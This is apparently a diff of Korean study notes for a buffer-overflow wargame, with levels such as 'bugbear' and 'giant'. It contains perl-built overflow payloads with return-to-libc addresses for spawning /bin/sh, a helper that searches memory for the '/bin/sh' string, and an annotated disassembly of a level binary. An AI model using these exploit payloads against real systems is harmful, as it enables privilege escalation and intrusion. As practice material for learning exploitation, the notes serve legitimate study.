-
-./test2 $(perl -e 'print "a"x104 . "\x18\x84\x04\x08" .
-
-"\x30\x84\x04\x08" . "\xff\xe0\xf5\x05" .
-
-"\x38\x56\x4c\x05"')
-
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0▒▒▒8VL
-
-call dummy02:99999999
-
- call dummy03:88888888
-
- Segmentation fault (core dumped)
-
-temp.c  시스템이라는 함수를
-
-사용할 수 있도록
-
-int main(){
-
-system("/bin/sh");
-
-return 0;
-
-}
-
-시스템함수는 400~에 들어있음.
-
-x/s system // print system
-
-/bin/sh라는 문자를 찾아서 사용.
-
-/* /bin/sh 찾는 프로그램
-
-*/
-
-int main(int argc, char **argv){
-
-long shell;
-
-shell=0x4005e430;
-
-while(memcmp((void*)shell,"/bin/sh",8)) shell++;
-
-printf("\"/bin/sh\" is at 0x%x\n",shell);
-
-}
-
- /=> 환경변수에 /bin/sh를 올려두고 풀어도 됨.
-
-"/bin/sh" is at 0x400fbff9
-
-p(print) system 0x40058ae0 <__libc_system> 
-
-0x400147a0:      "/bin/sh"
-
- ./bugbear $(perl -e 'print "a"x44 ."\xe0\x8a\x05\x40" . "a"x4 . "\xf9\xbf\x0f\x40"')
-
-x/s 해서
-
-0x40058ae0 <__libc_system>
-
-0x400391e0 <exit>
-
-인 것을 알게되었음
-
-a를 4개 집어넣는 대신 exit함수의 주소를 가리키게 되면 정상종료됨.
-
-bash2로 변경 먼저!
-
-use execve?
+프롤로그  push ebp
+        mov  ebp, esp
+에필로그  leave:     mov     esp,     ebp // esp에 ebp넣어줌
+                   pop     ebp          // esp가 가리키는곳의 값을 ebp에 넣어줌
+        ret:     pop     eip
+```
+
+## (14) LEVEL14: bugbear / new divide
 
   0x8048560  <main>:       push   %ebp   0x8048561  <main+1>:     mov    %ebp,%esp     0x8048563  <main+3>:     sub    %esp,60     0x8048566  <main+6>:     cmp    DWORD PTR  [%ebp+8],1   0x804856a  <main+10>:    jg     0x8048583  <main+35>   0x804856c  <main+12>:    push   0x8048700   0x8048571  <main+17>:    call   0x8048444  <printf>   0x8048576  <main+22>:    add    %esp,4     0x8048579  <main+25>:    push   0   0x804857b  <main+27>:    call   0x8048474  <exit>   0x8048580  <main+32>:    add    %esp,4     0x8048583  <main+35>:    push   0x804870c   0x8048588  <main+40>:    push   0x8048720   0x804858d  <main+45>:    call   0x8048404 <popen>   0x8048592  <main+50>:    add    %esp,8     0x8048595  <main+53>:    mov    %eax,%eax   0x8048597  <main+55>:    mov    DWORD PTR  [%ebp-44],%eax   0x804859a  <main+58>:    mov    %eax,DWORD PTR  [%ebp-44]   0x804859d  <main+61>:    push   %eax   0x804859e  <main+62>:    push   0xff   0x80485a3  <main+67>:    lea    %eax,[%ebp-40]   0x80485a6  <main+70>:    push   %eax    0x80485a7  <main+71>:    call   0x8048424  <fgets>   0x80485ac  <main+76>:    add    %esp,12     0x80485af  <main+79>:    lea    %eax,[%ebp-48]   0x80485b2  <main+82>:    push   %eax   0x80485b3  <main+83>:    push   0x804876b   0x80485b8  <main+88>:    lea    %eax,[%ebp-40]   0x80485bb <main+91>:     push   %eax   0x80485bc  <main+92>:    call   0x8048484  <sscanf>   0x80485c1  <main+97>:    add    %esp,12     0x80485c4  <main+100>:   mov    %eax,DWORD PTR [%ebp-44]   0x80485c7  <main+103>:   push   %eax   0x80485c8  <main+104>:   call   0x8048464 <fclose>   0x80485cd <main+109>:    add    %esp,4     0x80485d0  <main+112>:   push   0x804870c   0x80485d5 <main+117>:    push   0x8048780   0x80485da  <main+122>:   call   0x8048404 <popen>   0x80485df <main+127>:    add    %esp,8     0x80485e2  <main+130>:   mov    %eax,%eax   0x80485e4 <main+132>:    mov    DWORD PTR [%ebp-44],%eax   0x80485e7  <main+135>:   mov    %eax,DWORD PTR [%ebp-44]   0x80485ea  <main+138>:   push   %eax   0x80485eb  <main+139>:   push   0xff   0x80485f0 <main+144>:    lea    %eax,[%ebp-40]   0x80485f3  <main+147>:   push   %eax   0x80485f4 <main+148>:    call   0x8048424 <fgets>   0x80485f9  <main+153>:   add    %esp,12     0x80485fc <main+156>:    lea    %eax,[%ebp-52]   0x80485ff  <main+159>:   push   %eax   0x8048600 <main+160>:    push   0x80487c8   0x8048605  <main+165>:   lea    %eax,[%ebp-40]   0x8048608 <main+168>:    push   %eax   0x8048609  <main+169>:   call   0x8048484 <sscanf>   0x804860e <main+174>:    add    %esp,12     0x8048611  <main+177>:   mov    %eax,DWORD PTR [%ebp-44]   0x8048614  <main+180>:   push   %eax   0x8048615  <main+181>:   call   0x8048464 <fclose>   0x804861a <main+186>:    add    %esp,4     0x804861d  <main+189>:   mov    %eax,DWORD PTR [%ebp-48]   0x8048620  <main+192>:   mov    %edx,DWORD PTR  [%ebp-52]   0x8048623  <main+195>:   lea    %ecx,[%edx+%eax*1]   0x8048626  <main+198>:   mov    DWORD PTR  [%ebp-56],%ecx     0x8048629  <main+201>:   push   4   0x804862b  <main+203>:   mov    %eax,DWORD PTR  [%ebp+12]   0x804862e  <main+206>:   add    %eax,4   0x8048631  <main+209>:   mov    %edx,DWORD PTR  [%eax]   0x8048633  <main+211>:   add    %edx,44   0x8048636 <main+214>:    push   %edx   0x8048637  <main+215>:   lea    %eax,[%ebp-60]   0x804863a <main+218>:    push   %eax   0x804863b  <main+219>:   call   0x8048454 <memcpy>   0x8048640 <main+224>:    add    %esp,12     0x8048643  <main+227>:   mov    %eax,DWORD PTR [%ebp-60]   0x8048646  <main+230>:   cmp    %eax,DWORD PTR  [%ebp-56]   0x8048649  <main+233>:   je     0x8048662  <main+258>   0x804864b  <main+235>:   push   0x80487cb   0x8048650  <main+240>:   call   0x8048444 <printf>   0x8048655  <main+245>:   add    %esp,4     0x8048658  <main+248>:   push   0   0x804865a <main+250>:    call   0x8048474 <exit>   0x804865f  <main+255>:   add    %esp,4     0x8048662 <main+258>:    mov    %eax,DWORD PTR [%ebp+12]   0x8048665  <main+261>:   add    %eax,4   0x8048668 <main+264>:    mov    %edx,DWORD PTR [%eax]   0x804866a  <main+266>:   push   %edx   0x804866b <main+267>:    lea    %eax,[%ebp-40]   0x804866e  <main+270>:   push   %eax   0x804866f <main+271>:    call   0x8048494 <strcpy>   0x8048674  <main+276>:   add    %esp,8     0x8048677 <main+279>:    lea    %eax,[%ebp-40]   0x804867a  <main+282>:   push   %eax   0x804867b <main+283>:    push   0x80487e1   0x8048680  <main+288>:   call   0x8048444 <printf>   0x8048685 <main+293>:    add    %esp,8     0x8048688  <main+296>:   leave   0x8048689  <main+297>:   ret	에필로그   60바이트  스텍메모리 할당   char buffer40,    char *ebp_44 , char *ebp_48, char *  ebp_52, char * ebp_56, char *ebp_60       if(argc<=1){     printf("argv  error\n");         exit(0);     }     popen     r   /usr/bin/ldd /home/giant/assassin \|  /bin/grep libc \| /bin/awk '{print $4}'   popen( "/usr~" ,  "r" );       ebp_44=popen( "/usr" ,  "r");           fgets(buffer , 255 , ebp_44);           sscanf(buffer,"(%x)",ebp_48);               fclose(ebp_44);         "r"    "/usr/bin/nm  /lib/libc.so.6 \| /bin/grep __execve \| /bin/awk '{print $1}'"   popen( "/usr/~~~" ,  "r" );               fgets(buffer,255,ebp_44);                   sscanf(buffer,"%x",ebp_52);               fclose(ebp_44);         ebp_56=ebp_52+ebp_48                 memcpy( ebp_60,argv1, 4  );             if( ebp_60 != ebp_56){   printf( "You must use  execve!\n");   exit(0);   }                 strcpy( buffer , argv[1] )                     printf("%s\n",buffer);
                                           	                                        
